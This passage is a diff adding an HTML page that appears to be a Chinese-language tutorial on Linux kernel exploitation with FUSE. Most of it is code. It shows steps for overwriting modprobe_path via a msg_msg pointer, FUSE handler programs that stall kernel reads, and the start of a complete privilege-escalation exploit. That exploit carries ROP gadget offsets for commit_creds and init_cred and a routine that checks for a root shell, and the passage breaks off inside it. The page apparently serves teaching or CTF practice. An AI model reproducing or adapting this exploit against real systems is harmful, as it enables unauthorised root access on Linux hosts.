+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<ol>
+<li>首先fsopen系统调用</li>
+<li>然后打开FUSE文件系统，并创建一个管道(pipe,主要是为了接下来的写)</li>
+<li>申请两个相邻的页，其中打开的FUSE文件系统映射到第二个页</li>
+<li>创建<code>arb_write</code>线程，这个线程里包含漏洞触发函数</li>
+<li>尝试对FUSE文件系统进行读写，这时候会调用我们自定义的<code>evil_read</code>函数</li>
+<li>自定义的<code>evil_read</code>函数里尝试对管道进行写</li>
+<li>线程里触发漏洞函数，将msg_msg结构的next指针覆盖成modprobe_path，并尝试对管道进行读管道读的内容就被写进了modprobe_path里</li>
+</ol>
+<blockquote>
+<p>这块还不好说准不准确</p>
+</blockquote>
+<h3 id="shi-yong-fang-fa-2">使用方法2</h3><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">assert.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fuse_dir/lol</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*addr = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// mmap()ed the file in demand-zero paging
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">No read done from FUSE</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(addr != -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Triggering read from FUSE</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//THIS will trigger the call to FUSE read
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)addr);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">// FUSE: Filesystem in USErspace
+</span><span style="color:#65737e;">// fusefs.c - FUSE filesystem handler
+</span><span style="color:#65737e;">// Made by @LukeGix
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">FUSE_USE_VERSION </span><span style="color:#d08770;">26
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fuse.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">err.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/uio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">assert.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">FILE_TARGET &quot;</span><span style="color:#a3be8c;">/lol</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> file_size = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> file_buffer[</span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">];
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> len = </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_getattr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat *</span><span style="color:#bf616a;">stbuf</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> res = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(stbuf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, &quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_mode = S_IFDIR | </span><span style="color:#d08770;">0755</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_nlink = </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, FILE_TARGET) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_mode = S_IFREG | </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_nlink = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_size = file_size;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_blocks = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">        res = -ENOENT;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> res;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// It defines the result of, for example, `ls`
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_readdir</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, fuse_fill_dir_t </span><span style="color:#bf616a;">filler</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">filler</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">.</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">filler</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">..</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">filler</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">lol</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_open</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, FILE_TARGET) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(;;){
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Pausing kernel thread...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	    </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">200</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buf, file_buffer, size);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_write</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf_to_write</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi </span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, FILE_TARGET) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(offset &lt;= </span><span style="color:#d08770;">4096 </span><span style="color:#c0c5ce;">&amp;&amp; (file_size + size) &lt;= </span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">//Write in no-append mode
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(offset == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">		    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(file_buffer, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">		    file_size = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(file_buffer+offset, buf_to_write, size);
+</span><span style="color:#c0c5ce;">		file_size += size;
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// Just random stubs
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_setxattr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">c</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">d</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">e</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_truncate</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_chmod</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#bf616a;">mode_t</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_chown</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#bf616a;">uid_t</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">gid_t</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">FUSE_utimens</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> timespec </span><span style="color:#bf616a;">tv</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> fuse_operations FUSE_ops = {
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">getattr    </span><span style="color:#c0c5ce;">= FUSE_getattr,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">readdir    </span><span style="color:#c0c5ce;">= FUSE_readdir,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">open       </span><span style="color:#c0c5ce;">= FUSE_open,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">read       </span><span style="color:#c0c5ce;">= FUSE_read,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">write 	</span><span style="color:#c0c5ce;">= FUSE_write,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">setxattr 	</span><span style="color:#c0c5ce;">= FUSE_setxattr,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">truncate 	</span><span style="color:#c0c5ce;">= FUSE_truncate,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">chmod 	</span><span style="color:#c0c5ce;">= FUSE_chmod,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">chown 	</span><span style="color:#c0c5ce;">= FUSE_chown,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">utimens 	</span><span style="color:#c0c5ce;">= FUSE_utimens
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">[]) {
+</span><span style="color:#c0c5ce;">    	</span><span style="color:#65737e;">//Initialization of the filesystem
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">fuse_main</span><span style="color:#c0c5ce;">(argc, argv, &amp;FUSE_ops, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h3 id="yi-ge-wan-zheng-can-kao-exp">一个完整参考exp</h3><pre style="background-color:#2b303b;">
+<span style="color:#65737e;">// gcc exploit.c -o exploit -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">FUSE_USE_VERSION </span><span style="color:#d08770;">29
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">assert.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fuse.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/fuse.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">pthread.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">CMD_ADD </span><span style="color:#d08770;">0xf1ec0001
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">CMD_DEL </span><span style="color:#d08770;">0xf1ec0002
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">CMD_GET </span><span style="color:#d08770;">0xf1ec0003
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">CMD_SET </span><span style="color:#d08770;">0xf1ec0004
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">SPRAY_NUM </span><span style="color:#d08770;">0x10
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ofs_tty_ops </span><span style="color:#d08770;">0xc3c3c0
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">push_rdx_pop_rsp_pop_ret (kbase + </span><span style="color:#d08770;">0x09b13a</span><span style="color:#c0c5ce;">)
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">commit_creds (kbase + </span><span style="color:#d08770;">0x072830</span><span style="color:#c0c5ce;">)
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">pop_rdi_ret (kbase + </span><span style="color:#d08770;">0x09b0ed</span><span style="color:#c0c5ce;">)
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">swapgs_restore_regs_and_return_to_usermode (kbase + </span><span style="color:#d08770;">0x800e26</span><span style="color:#c0c5ce;">)
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">init_cred (kbase + </span><span style="color:#d08770;">0xe37480</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(msg);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">typedef struct </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> id;
+</span><span style="color:#c0c5ce;">    size_t size;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*data;
+</span><span style="color:#c0c5ce;">} request_t;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> user_cs, user_ss, user_sp, user_rflags;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">spawn_shell</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] returned to user land</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    uid_t uid = </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(uid == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] got root (uid = </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, uid);
+</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[!] failed to get root (uid: </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, uid);
